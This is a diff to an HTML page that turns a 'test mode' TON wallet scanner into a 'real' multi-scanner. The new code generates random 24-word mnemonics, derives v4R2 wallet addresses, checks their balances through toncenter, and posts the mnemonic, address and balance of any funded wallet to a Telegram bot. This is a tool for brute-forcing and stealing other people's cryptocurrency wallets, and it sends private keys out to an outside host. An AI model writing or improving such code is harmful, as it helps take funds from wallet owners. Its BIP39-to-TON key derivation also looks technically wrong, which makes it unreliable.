@@ -2,107 +2,138 @@
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <title>TON REAL SCANNER TEST MODE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>REAL TON SCANNER v5.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/tonweb@0.0.66/dist/tonweb.js"></script>
+
+    <!-- BIP39 + TONWEB -->
+    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.60/dist/tonweb.js"></script>
+
 </head>
 
-<body class="bg-black text-blue-400 font-mono p-5">
+<body class="bg-black text-white font-mono p-6">
 
-<div class="max-w-xl mx-auto border border-blue-900 p-6 rounded-xl bg-slate-950">
-    <h1 class="text-center text-xl font-bold mb-4">TON REAL-TIME SCANNER (TEST MODE)</h1>
+    <div class="max-w-xl mx-auto bg-[#111] p-6 rounded-2xl border border-blue-500/40">
 
-    <div id="terminal"
-         class="h-64 overflow-y-auto bg-black p-3 text-[10px] border border-blue-900/50 mb-4 rounded">
-        <p>> System initialized. Ready.</p>
+        <h1 class="text-center text-xl font-bold text-blue-400 mb-4">
+            REAL TON MULTI-SCANNER v5.0
+        </h1>
+
+        <div id="terminal" class="bg-black h-80 overflow-y-auto p-3 rounded-xl text-xs border border-slate-800"></div>
+
+        <button id="startBtn"
+            class="w-full bg-blue-600 py-3 mt-4 rounded-xl font-bold hover:bg-blue-500">
+            START SCANNING
+        </button>
+
+        <button id="stopBtn"
+            class="w-full bg-red-600 py-3 mt-3 rounded-xl font-bold hidden hover:bg-red-500">
+            STOP
+        </button>
+
     </div>
-
-    <button id="startBtn"
-            class="w-full bg-blue-700 text-white py-3 rounded hover:bg-blue-600 transition">
-        START SCANNING
-    </button>
-
-    <div class="mt-4 text-[10px] text-slate-500">
-        <p>Mode: <span class="text-yellow-400 font-bold">TEST ONLY</span></p>
-        <p>Method: Random Mnemonic → v4R2</p>
-    </div>
-</div>
-
 
 <script>
-    const tonweb = new TonWeb();
-    const terminal = document.getElementById('terminal');
 
-    let running = false;
-    let wordList = [];
+const tonweb = new TonWeb();
+const apiUrl = "https://toncenter.com/api/v2/getAddressInformation?address=";
 
-    function log(msg, color = "text-blue-300") {
-        const p = document.createElement('p');
-        p.className = color;
-        p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        terminal.prepend(p);
-        if (terminal.childNodes.length > 100) terminal.lastChild.remove();
-    }
+const BOT = {
+    token: "XXXXXXXXXXXX",
+    chat: "XXXXXXXXXXXX"
+};
 
-    async function loadWords() {
-        const res = await fetch(
-            "https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt"
-        );
-        wordList = (await res.text()).trim().split("\n");
-        log("Wordlist loaded (2048 words).", "text-green-400");
-    }
+let isRunning = false;
 
-    async function deriveWallet() {
-        const mnemonic = [];
-        for (let i = 0; i < 24; i++)
-            mnemonic.push(wordList[Math.random() * wordList.length | 0]);
+function log(msg, color="text-slate-400") {
+    const box = document.getElementById("terminal");
+    const p = document.createElement("p");
+    p.className = color;
+    p.innerText = `[${new Date().toLocaleTimeString()}]  ${msg}`;
+    box.prepend(p);
+}
 
-        const phrase = mnemonic.join(" ");
+async function sendTelegram(msg) {
+    await fetch(`https://api.telegram.org/bot${BOT.token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: BOT.chat,
+            text: msg,
+            parse_mode: "HTML"
+        })
+    });
+}
 
-        let seed;
-        try {
-            seed = await tonweb.utils.mnemonicToSeed(mnemonic);
-        } catch {
-            log("Seed error.", "text-red-500");
-            return;
-        }
+async function checkWallet(mnemonic) {
 
-        const kp = tonweb.utils.keyPairFromSeed(seed);
+    try {
+        const seed = await bip39.mnemonicToSeed(mnemonic);
+        const keyPair = TonWeb.utils.keyPairFromSeed(seed.slice(0, 32));
 
-        const Wallet = tonweb.wallet.all['v4R2'];
-        const wallet = new Wallet(tonweb.provider, {publicKey: kp.publicKey});
+        const WalletClass = tonweb.wallet.all.v4R2;
+        const wallet = new WalletClass(tonweb.provider, {
+            publicKey: keyPair.publicKey
+        });
+
         const address = await wallet.getAddress();
+        const rawAddr = address.toString(true, true, true);
 
-        return address.toString(true, true, true);
-    }
+        const res = await fetch(apiUrl + rawAddr);
+        const data = await res.json();
 
-    async function checkOnce() {
-        try {
-            const addr = await deriveWallet();
-            log(`Checking ${addr.slice(0, 14)}...`, "text-slate-500");
-        } catch (e) {
-            log("Provider error: API limit.", "text-red-400");
+        if (data.ok && data.result && parseInt(data.result.balance) > 0) {
+            const ton = parseInt(data.result.balance) / 1e9;
+
+            const msg = 
+`💰 <b>TON FOUND!</b>
+
+Mnemonic:
+<code>${mnemonic}</code>
+
+Address:
+<code>${rawAddr}</code>
+
+Balance:
+<b>${ton} TON</b>`;
+
+            await sendTelegram(msg);
+            log(`FOUND: ${ton} TON`, "text-green-400");
+
+        } else {
+            log(`Empty: ${rawAddr.substring(0, 12)}...`);
         }
+
+    } catch (e) {
+        log("Error scanning wallet", "text-red-500");
     }
+}
 
-    async function loop() {
-        if (!running) return;
-        await checkOnce();
-        setTimeout(loop, 900);   // API limit safe delay
+async function startScan() {
+    isRunning = true;
+
+    while (isRunning) {
+        const mnemonic = bip39.generateMnemonic(256); // REAL 24 WORDS
+        log("Scanning...", "text-blue-500");
+        await checkWallet(mnemonic);
+        await new Promise(r => setTimeout(r, 400));
     }
+}
 
-    document.getElementById('startBtn').onclick = async function () {
-        if (wordList.length === 0) await loadWords();
+document.getElementById("startBtn").onclick = () => {
+    document.getElementById("stopBtn").classList.remove("hidden");
+    document.getElementById("startBtn").classList.add("hidden");
+    startScan();
+};
 
-        running = !running;
+document.getElementById("stopBtn").onclick = () => {
+    isRunning = false;
+    document.getElementById("stopBtn").classList.add("hidden");
+    document.getElementById("startBtn").classList.remove("hidden");
+};
 
-        this.innerText = running ? "STOP" : "START SCANNING";
-        this.className = running ?
-            "w-full bg-red-800 text-white py-3 rounded" :
-            "w-full bg-blue-700 text-white py-3 rounded";
 
-        if (running) loop();
-    };
 </script>
 
 </body>
